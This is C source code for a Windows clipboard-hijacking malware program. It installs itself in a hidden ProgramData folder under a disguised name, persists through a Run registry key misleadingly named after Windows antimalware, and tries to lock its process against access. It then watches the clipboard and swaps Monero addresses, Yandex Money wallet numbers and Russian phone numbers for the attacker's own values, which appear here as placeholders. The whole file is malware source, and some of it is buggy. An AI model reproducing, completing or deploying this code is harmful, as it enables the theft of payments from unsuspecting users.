#include <windows.h>
#include <shlwapi.h>
#include <sddl.h>

#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#pragma comment (lib, "shlwapi.lib")

char* _monero_poloniex()
{
	return "test";
}

char* _yandex_money()
{
	return "111111111111111";
}

char* _phone()
{
	return "+79111111111";
}

/*
	Check file is exist
*/
BOOL isFileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = GetFileAttributes(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
	Full Path Getter
*/
char* GetFullPath()
{
	wchar_t buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);

	return buffer;
}

/*
	Change DACL
*/
void DenyAccessToPId(DWORD pId)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL);
	SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor);
}

/*
	Change Clipboard text
*/
void ChangeClipboard(wchar_t*str, int n)
{
	size_t len, i;
	HGLOBAL hMem;
	UINT uFormat;
	len = (n + 1)*(sizeof(wchar_t));
	hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), str, len);
	GlobalUnlock(hMem);
	OpenClipboard(0);
	EmptyClipboard();
	uFormat = CF_TEXT;
	SetClipboardData(uFormat, hMem);
	CloseClipboard();
}

/*
	Registry
*/
void RegAdd()
{
	HKEY hkey;

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
	RegSetValueEx(hkey, "Windows_Antimalware_Host_Syst", 0, REG_SZ, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", 70);
	RegCloseKey(hkey);
}

/*
	General Thread
*/
void Mnemosyne()
{
	HANDLE clip;
	char* pch;
	char* phone;
	
	RegAdd();

	while (TRUE)
	{
		if (OpenClipboard(NULL)) {
			clip = GetClipboardData(CF_TEXT);
			CloseClipboard();
		}

		pch = strstr(clip, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk"); // monero poloniex

		if (strlen(clip) == 15)
		{
			ChangeClipboard(_yandex_money(), strlen(_yandex_money()));
		}

		if (strlen(clip) == 12)
		{
			phone = strstr(clip, "+79"); // RU phones

			if (phone)
			{
				ChangeClipboard(_phone(), strlen(_phone()));
			}
		}

		if (pch)
		{
			ChangeClipboard(_monero_poloniex(), strlen(_monero_poloniex()));
		}

		Sleep(1000);
	}
}

/*
	Install in System
*/
void Install()
{
	char thisExe[MAX_PATH] = "";

	CreateDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}", NULL);
	GetModuleFileName(NULL, thisExe, MAX_PATH);
	CopyFile(thisExe, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", TRUE);

	SetCurrentDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}");
	ShellExecute(NULL, 0, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", "", 0, SW_HIDE);
}

/*
	Check AV and VM
*/
void Protection()
{

}

/*
	Init
*/
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (isFileExists("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe"))
	{
		if (strcmp(GetFullPath(), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
		{
			Protection();
			Mnemosyne();
		}
		else
		{
			ExitProcess(0);
		}
	}
	else
	{
		Install();
	}

	ExitProcess(0);
}